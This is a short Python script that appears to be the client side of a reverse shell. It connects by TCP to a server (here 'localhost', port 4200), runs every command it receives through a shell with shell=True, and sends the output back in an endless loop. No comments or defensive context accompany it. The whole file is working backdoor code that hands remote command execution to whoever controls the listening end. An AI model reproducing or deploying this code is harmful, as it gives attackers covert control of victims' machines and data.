import socket 
import os
import subprocess
import shlex
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server = "localhost"
port = 4200

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return 
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        return str(output)
    except:
        return"errorr"



client.connect((server, port))





while True:
    command = client.recv(4960).decode("utf-8")
    result = execute(command)
    if result == "errorr":
        continue
    if result and result.strip():
        client.send(result.encode("utf-8"))
    else: 
        continue